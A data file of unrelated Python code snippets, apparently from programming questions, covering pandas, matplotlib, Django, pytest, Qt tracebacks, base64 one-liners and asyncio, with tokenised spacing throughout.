"import sysimport gcimport numpy as npimport matplotlibmatplotlib.use ( 'Agg ' ) import matplotlib.pyplot as pltimport pandas as pdpdindex = pd.date_range ( start='01/01/2013 ' , freq='15min ' , end='01/01/2019 ' ) df = pd.DataFrame ( { 'test ' : np.random.normal ( 0,1 , len ( pdindex ) ) } , index=pdindex ) def memplot_plot ( df , i ) : df.test.plot ( ) plt.title ( 'graph ' + str ( i ) ) plt.savefig ( str ( i ) + '.png ' , dpi=144 ) plt.close ( ) for i in range ( 1 , 100 ) : print '******************************* ' print ' i : ' + str ( i ) print len ( gc.get_objects ( ) ) print sys.getsizeof ( gc.get_objects ( ) ) memplot_plot ( df , i ) gc.collect ( ) *******************************i : 174682325680*******************************i : 22906271190248*******************************i : 35064202145012*******************************i : 47219933054204*******************************i : 59375663865524*******************************i : 611531394892352Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` C : \Anaconda\lib\site- packages\spyderlib\widgets\externalshell\sitecustomize.py '' , line 580 , in runfile execfile ( filename , namespace ) File `` C : /PERSO/script_backtesting.py '' , line 124 , in < module > memplot_plot ( df , i ) File `` C : /PERSO/script_backtesting.py '' , line 107 , in memplot_plot plt.savefig ( str ( i ) + '.png ' , dpi=144 ) File `` C : \Anaconda\lib\site-packages\matplotlib\pyplot.py '' , line 576 , in savefig res = fig.savefig ( *args , **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\figure.py '' , line 1470 , in savefig self.canvas.print_figure ( *args , **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\backend_bases.py '' , line 2192 , in print_figure **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\backends\backend_agg.py '' , line 513 , in print_png FigureCanvasAgg.draw ( self ) File `` C : \Anaconda\lib\site-packages\matplotlib\backends\backend_agg.py '' , line 461 , in draw self.figure.draw ( self.renderer ) File `` C : \Anaconda\lib\site-packages\matplotlib\artist.py '' , line 59 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\figure.py '' , line 1079 , in draw func ( *args ) File `` C : \Anaconda\lib\site-packages\matplotlib\artist.py '' , line 59 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\axes\_base.py '' , line 2092 , in draw a.draw ( renderer ) File `` C : \Anaconda\lib\site-packages\matplotlib\artist.py '' , line 59 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` C : \Anaconda\lib\site-packages\matplotlib\axis.py '' , line 1103 , in draw ticks_to_draw = self._update_ticks ( renderer ) File `` C : \Anaconda\lib\site-packages\matplotlib\axis.py '' , line 957 , in _update_ticks tick_tups = [ t for t in self.iter_ticks ( ) ] File `` C : \Anaconda\lib\site-packages\matplotlib\axis.py '' , line 903 , in iter_ticks self.major.formatter.set_locs ( majorLocs ) File `` C : \Anaconda\lib\site-packages\pandas\tseries\converter.py '' , line 982 , in set_locs self._set_default_format ( vmin , vmax ) File `` C : \Anaconda\lib\site-packages\pandas\tseries\converter.py '' , line 966 , in _set_default_format format = np.compress ( info [ 'maj ' ] , info ) File `` C : \Anaconda\lib\site-packages\numpy\core\fromnumeric.py '' , line 1563 , in compress return compress ( condition , axis , out ) MemoryError"
"from django.contrib import adminfrom django.db import connectionclass CountProxy : def __call__ ( self ) : # how to access the queryset ` query ` here ? query = ... try : if not query.where : cursor = connection.cursor ( ) cursor.execute ( `` SELECT reltuples FROM pg_class WHERE relname = % s '' , [ query.model._meta.db_table ] ) n = int ( cursor.fetchone ( ) [ 0 ] ) if n > = 1000 : return n # exact count for small tables return object_list.count ( ) except : # exception for lists return len ( object_list ) return estimated_countclass MyAdmin ( admin.ModelAdmin ) : def get_queryset ( self , request ) : qs = super ( MyAdmin , self ) .get_queryset ( request ) qs.count = CountProxy ( ) return qs"
"class Testament ( ) : def __init__ ( self , name ) : self.name = name def check ( self ) : return True from testament.testament import Testamentdef test_send ( ) : testament = Testament ( `` Paul '' ) assert testament.check ( )"
col1 | col2 | col3 | col4 | col5 | col6 0 - | 15.0 | - | - | - | - 1 - | - | - | - | - | US 2 - | - | - | Large | - | - 3 ABC1 | - | - | - | - | - 4 - | - | 24RA | - | - | - 5 - | - | - | - | 345 | - output DF : col1 | col2 | col3 | col4 | col5 | col6 0 ABC1 | 15.0 | 24RA | Large | 345 | US
"import pandas as pdstore = pd.HDFStore ( 'test.h5 ' ) midx = pd.MultiIndex.from_product ( [ range ( 2 ) , list ( 'XYZ ' ) ] , names=list ( 'AB ' ) ) df = pd.DataFrame ( dict ( C=range ( 6 ) ) , midx ) df CA B 0 X 0 Y 1 Z 21 X 3 Y 4 Z 5 midx2 = pd.MultiIndex.from_product ( [ range ( 2 ) , list ( 'VWX ' ) ] , names=list ( 'AB ' ) ) df2 = pd.DataFrame ( dict ( C=range ( 6 ) ) , midx2 ) df2 CA B 0 V 0 W 1 X 21 V 3 W 4 X 5 store.append ( 'df ' , df ) store.get ( 'df ' ) CA B 0 X 0 Y 1 Z 21 X 3 Y 4 Z 5 store.append ( 'df ' , df2 ) store.get ( 'df ' ) CA B 0 X 0 Y 1 Z 21 X 3 Y 4 Z 50 V 0 W 1 X 21 V 3 W 4 X 5 CA B 0 V 0 W 1 X 2 Y 1 Z 21 V 3 W 4 X 5 Y 4 Z 5"
"# Python 3class Point ( tuple ) : def __init__ ( self , x , y ) : super ( ) .__init__ ( ( x , y ) ) Point ( 2 , 3 )"
"> > > from scipy.stats import hypergeom > > > hypergeom.sf ( 5,10,2,5 ) > > > hypergeom.sf ( 2,10,2,2 ) -4.44 ... . > > > hypergeom.sf ( 5,10,2,5 ) 0.0"
Some text ... : foo : barSome text ... { `` foo '' : `` bar '' } tree = docutils.core.publish_parts ( text ) < document source= '' < string > '' > < docinfo > < field > < field_name > foo < field_body > < paragraph > bar
"q = Q ( ) for filter in filters : if filter_applies ( filter ) : q.add ( Q ( some_criteria ) , Q.OR ) if q.not_empty ( ) : some_query_set.filter ( q )"
"@ fixture ( params= [ 'hello ' , 'world ' ] def data ( request ) : return request.paramdef test_something ( data ) : pass test_example.py:7 : test_something [ hello ] PASSEDtest_example.py:7 : test_something [ world ] PASSED class Param ( object ) : def __init__ ( self , text ) : self.text = text @ fixture ( params= [ Param ( 'hello ' ) , Param ( 'world ' ) ] def data ( request ) : return request.paramdef test_something ( data ) : pass test_example.py:7 : test_something [ p0 ] PASSEDtest_example.py:7 : test_something [ p1 ] PASSED"
"# 0 0xb5c296fc in QMutex : :lock ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 1 0xb3bdd97d in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 2 0xb3bdf0d0 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 3 0xb3bd4418 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 4 0xb3bd8b1e in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 5 0xb5dedf10 in QMetaObject : :activate ( QObject* , int , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 6 0xb5dee48b in QMetaObject : :activate ( QObject* , QMetaObject const* , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 7 0xb5e59155 in QIODevice : :readyRead ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 8 0xb3bb1f14 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 9 0xb3ba4d99 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 10 0xb3bc03bb in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 11 0xb6483a54 in QApplicationPrivate : :notify_helper ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Widgets.so.5 # 12 0xb6488e66 in QApplication : :notify ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Widgets.so.5 # 13 0xb6bb7e80 in sipQApplication : :notify ( QObject* , QEvent* ) ( ) from /usr/lib/python3/dist-packages/PyQt5/QtWidgets.cpython-33m-i386-linux-gnu.so # 14 0xb5dc737a in QCoreApplication : :notifyInternal ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 15 0xb5e11f67 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 16 0xb5aaf83e in g_main_context_dispatch ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 17 0xb5aafbe8 in ? ? ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 18 0xb5aafca8 in g_main_context_iteration ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 19 0xb5e1138f in QEventDispatcherGlib : :processEvents ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 20 0xb5dc5c06 in QEventLoop : :processEvents ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 21 0xb5dc6014 in QEventLoop : :exec ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 22 0xb5c2b90b in QThread : :exec ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 23 0xb5c2b99b in QThread : :run ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 24 0xb5c2fa08 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 25 0xb7774d78 in start_thread ( arg=0xa5314b40 ) at pthread_create.c:311 # 26 0xb76ac01e in clone ( ) at ../sysdeps/unix/sysv/linux/i386/clone.S:131 from PyQt5.QtCore import QUrl , QTimerfrom PyQt5.QtWidgets import QApplicationfrom PyQt5.QtWebKitWidgets import QWebViewapp = QApplication ( [ ] ) wv = QWebView ( ) wv.load ( QUrl ( `` http : //www.heise.de/ '' ) ) t = QTimer ( ) t.timeout.connect ( QApplication.quit ) t.start ( 1000 ) wv.show ( ) app.exec_ ( ) # 0 0xb6cfd8d2 in QCoreApplication : :postEvent ( QObject* , QEvent* , int ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 1 0xb6d21c83 in QMetaObject : :activate ( QObject* , int , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 2 0xb6d2248b in QMetaObject : :activate ( QObject* , QMetaObject const* , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 3 0xb3e47935 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 4 0xb3dcf687 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 5 0xb3e483b3 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 6 0xb6d21f10 in QMetaObject : :activate ( QObject* , int , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 7 0xb6d2248b in QMetaObject : :activate ( QObject* , QMetaObject const* , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 8 0xb3e43fe5 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 9 0xb3d93b1e in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 10 0xb3d94630 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 11 0xb3d9471b in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 12 0xb6d21f10 in QMetaObject : :activate ( QObject* , int , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 13 0xb6d2248b in QMetaObject : :activate ( QObject* , QMetaObject const* , int , void** ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 14 0xb6d8d155 in QIODevice : :readyRead ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 15 0xb3e09f14 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 16 0xb3dfcd99 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 17 0xb3e183bb in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Network.so.5 # 18 0xb492ba54 in QApplicationPrivate : :notify_helper ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Widgets.so.5 # 19 0xb4930e66 in QApplication : :notify ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Widgets.so.5 # 20 0xb505fe80 in sipQApplication : :notify ( QObject* , QEvent* ) ( ) from /usr/lib/python3/dist-packages/PyQt5/QtWidgets.cpython-33m-i386-linux-gnu.so # 21 0xb6cfb37a in QCoreApplication : :notifyInternal ( QObject* , QEvent* ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 22 0xb6d45f67 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 23 0xb65f483e in g_main_context_dispatch ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 24 0xb65f4be8 in ? ? ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 25 0xb65f4ca8 in g_main_context_iteration ( ) from /lib/i386-linux-gnu/libglib-2.0.so.0 # 26 0xb6d4536d in QEventDispatcherGlib : :processEvents ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 27 0xb6cf9c06 in QEventLoop : :processEvents ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 28 0xb6cfa014 in QEventLoop : :exec ( QFlags < QEventLoop : :ProcessEventsFlag > ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 29 0xb6b5f90b in QThread : :exec ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 30 0xb6b5f99b in QThread : :run ( ) ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 31 0xb6b63a08 in ? ? ( ) from /usr/lib/i386-linux-gnu/libQt5Core.so.5 # 32 0xb7798d78 in start_thread ( arg=0xa7812b40 ) at pthread_create.c:311 # 33 0xb76d001e in clone ( ) at ../sysdeps/unix/sysv/linux/i386/clone.S:131"
"col1 , col2A 0A 1B 2C 3 { A : [ 0,1 ] , B : [ 2 ] , C : [ 3 ] } df.set_index ( 'col1 ' ) [ 'col2 ' ] .to_dict ( )"
$ perl -MMIME : :Base64 -e 'print encode_base64 ( `` ASDF1234asdf '' ) 'QVNERjEyMzRhc2Rm $ base64 < < < `` ASDF1234asdf '' QVNERjEyMzRhc2RmCg== $ python3.6 -m base64 < < < `` ASDF1234asdf '' QVNERjEyMzRhc2RmCg== $ python2.7 -m base64 < < < `` ASDF1234asdf '' QVNERjEyMzRhc2RmCg== $ perl -MMIME : :Base64 -e `` print encode_base64 ( 'my_user_name @ my_domain.com ' ) '' bXlfdXNlcl9uYW1lQG15X2RvbWFpbi5jb20= $ base64 < < < `` my_user_name @ my_domain.com '' bXlfdXNlcl9uYW1lQG15X2RvbWFpbi5jb20K
"Cname=Form_Cities [ `` name '' ] .values Clat=Form_Cities [ `` lat '' ] .valuesClon=Form_Cities [ `` lon '' ] .values map=Basemap ( projection= '' lcc '' , resolution= '' l '' , width=1E6 , height=1E6 , lon_0=9.9167 , lat_0=51.5167 , fix_aspect=False ) # Resturn just the empty `` figure with no conotents on itmap.shadedrelief ( ) map.drawcountries ( color= '' black '' , zorder=1 , linewidth=1 ) ax.annotate ( s=Cname , xy= ( Clon , Clat ) , xycoords= '' axes pixels '' )"
"setup ( ... install_requires= [ 'GEDThriftStubs ' ] , dependency_links= [ 'git+ssh : //user @ git.server.com/ged-thrift-stubs.git # egg=GEDThriftStubs ' ] , ... ) python setup.py sdist Downloading/unpacking GEDThriftStubs ( from package==0.0.1 ) Could not find any downloads that satisfy the requirement GEDThriftStubs ( from package==0.0.1 ) No distributions at all found for GEDThriftStubs ( from package==0.0.1 ) Skipping link git+ssh : //user @ git.server.com/ged-thrift-stubs.git # egg=GEDThriftStubs ; wrong project name ( not gedthriftstubs ) pip install git+ssh : //user @ git.server.com/ged-thrift-stubs.git # egg=GEDThriftStubs"
import loggingprint logging.getLogger ( ) .name # rootprint logging.getLogger ( __name__ ) .name # __main__ if __name__ == `` __main__ '' : logger = logging.getLogger ( ) else : logger = logging.getLogger ( __name__ )
"> > > pattern = r '' \| ( [ ^\| ] * ) \| '' > > > re.match ( pattern , `` |test| '' ) < _sre.SRE_Match object at 0x10341dd50 > > > > re.match ( pattern , `` |test| '' ) > > > re.match ( pattern , `` asdf|test| '' ) > > > re.match ( pattern , `` asdf|test|1234 '' ) > > > re.match ( pattern , `` |test|1234 '' ) < _sre.SRE_Match object at 0x10341df30 >"
"# my prefered way_list= [ 1,2,3 ] _list+= [ 4,5,6 ] print _list # [ 1 , 2 , 3 , 4 , 5 , 6 ] # why use extend : _list= [ 1,2,3 ] _list.extend ( [ 4,5,6 ] ) print _list # [ 1 , 2 , 3 , 4 , 5 , 6 ] _lists= [ range ( 3*i,3*i+3 ) for i in range ( 3 ) ] # [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 ] , [ 6 , 7 , 8 ] ] # my prefered way of merging listsprint sum ( _lists , [ ] ) # [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] # is there a better way ? from itertools import chainprint list ( chain ( *_lists ) ) # [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ]"
"from abc import abstractmethodclass A ( object ) : def __init__ ( self ) : self.a = 5 @ abstractmethod def f ( self ) : return self.aa = A ( ) a.f ( ) class B ( A ) : def __init__ ( self ) : super ( B , self ) .__init__ ( ) b = B ( ) b.f ( )"
"import mathfrom pylab import *import numpy as npimport scipy as spimport matplotlib.pyplot as pltfrom scipy.optimize import curve_fitdata2=np.loadtxt ( 'FWHM.spc ' ) x2 , y2=data2 [ : ,0 ] , data2 [ : ,7 ] plt.title ( 'Full Width Half Max of 002 Peak ' ) plt.plot ( x2 , y2 , color= ' b ' ) plt.xlabel ( ' $ \\theta $ ' , fontsize=10 ) plt.ylabel ( 'Intensity ' , fontsize=10 ) plt.xlim ( [ 3,11 ] ) plt.xticks ( np.arange ( 3 , 12 , 1 ) , fontsize=10 ) plt.yticks ( fontsize=10 ) def func ( x , a , x0 , sigma ) : return a*np.exp ( - ( x-x0 ) **2/ ( 2*sigma**2 ) ) mean = sum ( x2*y2 ) /sum ( y2 ) sigma2 = sqrt ( abs ( sum ( ( x2-mean ) **2*y2 ) /sum ( y2 ) ) ) popt , pcov = curve_fit ( func , x2 , y2 , p0 = [ 1 , mean , sigma2 ] ) ym = func ( x2 , popt [ 0 ] , popt [ 1 ] , popt [ 2 ] ) plt.plot ( x2 , ym , c= ' r ' , label='Best fit ' ) FWHM = round ( 2*np.sqrt ( 2*np.log ( 2 ) ) *popt [ 2 ] ,4 ) axvspan ( popt [ 1 ] -FWHM/2 , popt [ 1 ] +FWHM/2 , facecolor= ' g ' , alpha=0.3 , label='FWHM = % s ' % ( FWHM ) ) plt.legend ( fontsize=10 ) plt.show ( )"
"import urllib.requestsites = [ 'https : //www.yahoo.com/ ' , 'http : //www.cnn.com ' , 'http : //www.python.org ' , 'http : //www.jython.org ' , 'http : //www.pypy.org ' , 'http : //www.perl.org ' , 'http : //www.cisco.com ' , 'http : //www.facebook.com ' , 'http : //www.twitter.com ' , 'http : //www.macrumors.com/ ' , 'http : //arstechnica.com/ ' , 'http : //www.reuters.com/ ' , 'http : //abcnews.go.com/ ' , 'http : //www.cnbc.com/ ' , ] for url in sites : with urllib.request.urlopen ( url ) as u : page = u.read ( ) print ( url , len ( page ) ) import urllib.requestimport trio , timesites = [ 'https : //www.yahoo.com/ ' , 'http : //www.cnn.com ' , 'http : //www.python.org ' , 'http : //www.jython.org ' , 'http : //www.pypy.org ' , 'http : //www.perl.org ' , 'http : //www.cisco.com ' , 'http : //www.facebook.com ' , 'http : //www.twitter.com ' , 'http : //www.macrumors.com/ ' , 'http : //arstechnica.com/ ' , 'http : //www.reuters.com/ ' , 'http : //abcnews.go.com/ ' , 'http : //www.cnbc.com/ ' , ] async def show_len ( sites ) : t1 = time.time ( ) for url in sites : with urllib.request.urlopen ( url ) as u : page = u.read ( ) print ( url , len ( page ) ) print ( `` code took to run '' , time.time ( ) - t1 ) if __name__ == `` __main__ '' : trio.run ( show_len , sites ) import urllib.requestimport trio , timesites = [ 'https : //www.yahoo.com/ ' , 'http : //www.cnn.com ' , 'http : //www.python.org ' , 'http : //www.jython.org ' , 'http : //www.pypy.org ' , 'http : //www.perl.org ' , 'http : //www.cisco.com ' , 'http : //www.facebook.com ' , 'http : //www.twitter.com ' , 'http : //www.macrumors.com/ ' , 'http : //arstechnica.com/ ' , 'http : //www.reuters.com/ ' , 'http : //abcnews.go.com/ ' , 'http : //www.cnbc.com/ ' , ] async def link_user ( url ) : with urllib.request.urlopen ( url ) as u : page = u.read ( ) print ( url , len ( page ) ) async def show_len ( sites ) : t1 = time.time ( ) for url in sites : await link_user ( url ) print ( `` code took to run '' , time.time ( ) - t1 ) if __name__ == `` __main__ '' : trio.run ( show_len , sites )"
"import matplotlib.pylab as ppimport numpy as npalpha = np.linspace ( 0 , 2 * np.pi , 400 ) sig1 = np.sin ( alpha ) sig2 = np.sin ( 2 * alpha ) + 2 * ( alpha > np.pi ) ax1 = pp.subplot ( 111 ) ax2 = ax1.twinx ( ) ax1.plot ( alpha , sig1 , color= ' b ' ) ax2.plot ( alpha , sig2 , color= ' r ' ) ax1.set_ylabel ( 'sig1 value ' , color= ' b ' ) ax2.set_ylabel ( 'sig2 value ' , color= ' r ' ) pp.grid ( ) pp.show ( )"
< rdf : RDF xmlns : _3= '' http : //www.my-example.intra/ontologies/ci.owl # '' > < rdf : RDF xmlns : ex= '' http : //www.my-example.intra/ontologies/ci.owl # '' >
import requestsimport urllib2 from bs4 import BeautifulSoup # This is the original url http : //www.kmdvalg.dk/soup = BeautifulSoup ( urllib2.urlopen ( 'http : //www.kmdvalg.dk/ ' ) .read ( ) ) my_list = [ ] all_links = soup.find_all ( `` a '' ) for link in all_links : link2 = link [ `` href '' ] my_list.append ( link2 ) for i in my_list [ 1:93 ] : print i # The output shows all the links that I would like to follow and gather information from . How do I do that ?
"cd /Users/AVFL/Documents/Programming ; env `` PYTHONIOENCODING=UTF-8 '' PYTHONUNBUFFERED=1 '' /usr/local/bin/python3/Users/AVFL/.vscode/extensions/ms-python.python-2018.3.1/pythonFiles/PythonTools/visualstudio_py_launcher.py/Users/AVFL/Documents/Programming 54323 34806ad9-833a-4524-8cd6-18ca4aa74f14 RedirectOutput , RedirectOutput/Users/AVFL/Documents/Programming/Python/Projects/Entrepeneuring/employeeDatabase.py"
A [ 0 ] = 1A [ 1 ] = 7A [ 2 ] = 6A [ 3 ] = 2A [ 4 ] = 6A [ 5 ] = 4 def amp ( sub_list ) : if len ( sub_list ) < 2 : return 0 else : return max ( sub_list ) - min ( sub_list ) def solution ( A ) : A.sort ( ) longest = 0 idxStart = 0 idxEnd = idxStart + 1 while idxEnd < = len ( A ) : tmp = A [ idxStart : idxEnd ] if amp ( tmp ) < 2 : idxEnd += 1 if len ( tmp ) > longest : longest = len ( tmp ) else : idxStart = idxEnd idxEnd = idxStart + 1 return longest
"def pascal ( curlvl , newlvl , tri ) : if curlvl == newlvl : return `` '' else : tri.append ( tri [ curlvl ] ) print ( tri ) return pascal ( curlvl+1 , newlvl , tri ) def triLvl ( ) : msg = `` Please enter the number of levels to generate : '' triheight = int ( input ( msg ) ) if triheight < 1 : print ( `` \n Sorry , the number MUST be positive\n Please try again . '' ) return triLvl ( ) else : return triheightdef main ( ) : triangle = [ 1 ] curlvl = 0 print ( `` Welcome to the Pascal 's triangle generator . '' ) usrTri = triLvl ( ) print ( triangle ) pascal ( curlvl , usrTri , triangle ) main ( )"
"def upload_to_location ( instance , filename ) : try : blocks = filename.split ( ' . ' ) ext = blocks [ -1 ] filename = `` % s. % s '' % ( uuid.uuid4 ( ) , ext ) instance.title = blocks [ 0 ] return os.path.join ( 'uploads/ ' , filename ) except Exception as e : print ' % s ( % s ) ' % ( e.message , type ( e ) ) return 0class Photo ( models.Model ) : description = models.TextField ( validators= [ MaxLengthValidator ( 500 ) ] ) submitted_on = models.DateTimeField ( auto_now_add=True ) image_file = models.ImageField ( upload_to=upload_to_location , null=True , blank=True ) Exception Value : 'module ' object has no attribute 'WindowsAzureMissingResourceError'Exception Location : /home/mhb11/.virtualenvs/myvirtualenv/local/lib/python2.7/site-packages/storages/backends/azure_storage.py in exists , line 46 def exists ( self , name ) : try : self.connection.get_blob_properties ( self.azure_container , name ) except azure.WindowsAzureMissingResourceError : return False else : return True DEFAULT_FILE_STORAGE = 'storages.backends.azure_storage.AzureStorage ' AZURE_ACCOUNT_NAME = 'photodatabasestorage ' AZURE_ACCOUNT_KEY = 'something ' AZURE_CONTAINER = 'somecontainer '"
"class Category0 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) class Category1 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) parent = models.ForeignKey ( Category0 ) class Category2 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) parent = models.ForeignKey ( Category1 ) class Category3 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) parent = models.ForeignKey ( Category2 ) class Category4 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) parent = models.ForeignKey ( Category3 ) class Category5 ( models.Model ) : name = models.CharField ( max_length=50 , unique=True ) slug = models.SlugField ( max_length=60 ) parent = models.ForeignKey ( Category4 ) class Product ( models.Model ) : title = models.CharField ( max_length=20 ) slug = AutoSlugField ( unique=True , populate_from='title ' ) content = models.TextField ( blank=True ) category = models.ForeignKey ( CategoryChild4 )"
"ContentType = apps.get_model ( 'contenttypes ' , 'ContentType ' ) my_model_content_type = ContentType.objects.get ( app_label='my_app ' , model='my_model ' ) __fake__.DoesNotExist : ContentType matching query does not exist . update_contenttypes ( apps.app_configs [ 'contenttypes ' ] ) update_contenttypes ( apps.app_configs [ 'my_app ' ] )"
a = 1b = aa = 2print ( b )
"( x , _ ) , ( y , _ ) = load_data ( )"
"import openpyxl book = openpyxl.load_workbook ( sheet_path ) sheet = book.active for row in range ( sheet.max_row ) : index = row + 1 sheet.cell ( row=index , column=1 ) .value = `` something '' book.save ( sheet_path )"
"# demo.pyimport asyncioimport randomimport signalasync def worker ( ) : sleep_time = random.random ( ) * 3 await asyncio.sleep ( sleep_time ) print ( f '' Slept for { sleep_time } seconds '' ) async def dispatcher ( queue ) : while True : await queue.get ( ) asyncio.create_task ( worker ( ) ) tasks = asyncio.all_tasks ( ) print ( f '' Running Tasks : { len ( tasks ) } '' ) async def shutdown ( loop ) : tasks = [ t for t in asyncio.all_tasks ( ) if t is not asyncio.current_task ( ) ] for task in tasks : task.cancel ( ) print ( f '' Cancelling { len ( tasks ) } outstanding tasks '' ) results = await asyncio.gather ( *tasks , return_exceptions=True ) print ( f '' results : { results } '' ) loop.stop ( ) async def main ( ) : loop = asyncio.get_event_loop ( ) loop.add_signal_handler ( signal.SIGINT , lambda : asyncio.create_task ( shutdown ( loop ) ) ) queue = asyncio.Queue ( ) asyncio.create_task ( dispatcher ( queue ) ) while True : await queue.put ( 'tick ' ) await asyncio.sleep ( 1 ) asyncio.run ( main ( ) ) > > python demo.py Running Tasks : 3Slept for 0.3071352174511871 secondsRunning Tasks : 3Running Tasks : 4Slept for 0.4152310498820644 secondsRunning Tasks : 4^CCancelling 4 outstanding tasksTraceback ( most recent call last ) : File `` demo.py '' , line 38 , in < module > asyncio.run ( main ( ) ) File `` /Users/max.taggart/.pyenv/versions/3.8.0/lib/python3.8/asyncio/runners.py '' , line 43 , in run return loop.run_until_complete ( main ) File `` /Users/max.taggart/.pyenv/versions/3.8.0/lib/python3.8/asyncio/base_events.py '' , line 608 , in run_until_complete return future.result ( ) asyncio.exceptions.CancelledError"
"from __future__ import walrus __future__.all_feature_names [ 'nested_scopes ' , 'generators ' , 'division ' , 'absolute_import ' , 'with_statement ' , 'print_function ' , 'unicode_literals ' , 'barry_as_FLUFL ' , 'generator_stop ' , 'annotations ' ]"
"print 'Loading file into memory'input_file = open ( input_file_name , ' r ' ) input_file.readline ( ) # Toss out the headerlines = [ ] totalLines = 31164015.0currentLine = 0.0printEvery100000 = 0for line in input_file : currentLine += 1.0 lined = line.split ( '\t ' ) printEvery100000 += 1 if printEvery100000 == 100000 : print str ( currentLine / totalLines ) printEvery100000 = 0 ; lines.append ( ( lined [ timestamp_pos ] .strip ( ) , lined [ personID_pos ] .strip ( ) , lined [ x_pos ] .strip ( ) , lined [ y_pos ] .strip ( ) ) ) input_file.close ( ) print 'Done loading file into memory '"
